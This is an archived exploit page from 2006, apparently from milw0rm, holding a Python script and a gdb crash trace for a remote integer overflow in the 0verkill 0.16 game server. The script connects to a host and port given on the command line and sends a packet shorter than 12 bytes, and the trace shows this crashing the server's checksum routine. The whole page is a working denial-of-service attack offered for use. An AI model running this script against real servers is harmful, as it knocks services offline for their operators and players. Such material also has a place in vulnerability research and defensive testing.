<html><head><title>0verkill 0.16 (ASCII-ART Game) Remote Integer Overflow Crash Exploit</title></head><pre>#!/usr/bin/env python
#
# -----------------------------------------------------
# Exploit id: FSE:016
#
# Author:     Federico Fazzi
# Contact:    federico@autistici.org
# Date:	    09/06/2006, 13:58
# Sinthesis:  0verkill 0.16, Remote integer overflow
# Product:    http://artax.karlin.mff.cuni.cz/~brain/0verkill/
# -----------------------------------------------------
#
# Start with:
# python f_0k-0.1.py &lt;remote_addr&gt; &lt;remote_port&gt;
#

# Proof of concept:
# (gdb) run
# Starting program: /home/federico/0verkill-0.16/server
# 9. 6.2006 14:18:07  Running 0verkill server version 0.16
# 9. 6.2006 14:18:07  Initialization.
# 9. 6.2006 14:18:07  Loading sprites.
# 9. 6.2006 14:18:07  Loading level &quot;level1&quot;....
# 9. 6.2006 14:18:07  Loading level graphics.
# 9. 6.2006 14:18:08  Loading level map.
# 9. 6.2006 14:18:08  Loading level objects.
# 9. 6.2006 14:18:08  Initializing socket.
# 9. 6.2006 14:18:08  Installing signal handlers.
# 9. 6.2006 14:18:08  Game started.
# 9. 6.2006 14:18:08  Sleep
# 9. 6.2006 14:18:10  Wakeup
#
# (run python f_0k-0.6.py)
#
# Program received signal SIGSEGV, Segmentation fault.
# crc32 (buf=0x837a000 &lt;Address 0x837a000 out of bounds&gt;, len=4294967288) at crc32.c:82
# warning: Source file is more recent than executable.
# 82            DO8(buf);
#
# #0  0x0805b54a in recv_packet (packet=0x805fd20 &quot;&quot;,
# max_len=256, addr=0xf18df475, addr_len=0xf18df475, sender_server=0, recipient=0,
# sender=0xbfcf6d54) at net.c:94
# 94              if (crc!=crc32(packet,retval-12))return -1;
#
# limits byte receive is 12, if you send an inferior number of it
# the game crash.

import os, sys
from socket import *

usage = &quot;run: python %s [remote_addr] [remote_port] &quot; % os.path.basename(sys.argv[0])

if len(sys.argv) &lt; 3: 
	print usage 
	sys.exit()

host = sys.argv[1]
port = int(sys.argv[2])

sock = socket(AF_INET, SOCK_DGRAM)
sock.connect((host, port))

print &quot;connecting.. &quot;,
if sock &gt; 0:
    print &quot;done!&quot;
else:
    print &quot;wrong!&quot;

print &quot;crashing the server.. &quot;,
if sock.sendto('0x00' , (host, port)):
    print &quot;done!&quot;
else:
    print &quot;wrong!&quot;

print &quot;wait five seconds, if no data found press CTRL+C&quot;
try:
	reply = sock.recvfrom(512)
	print reply
except:
	print &quot;no data receive!&quot;
	sys.exit()

# milw0rm.com [2006-06-09]</pre></html>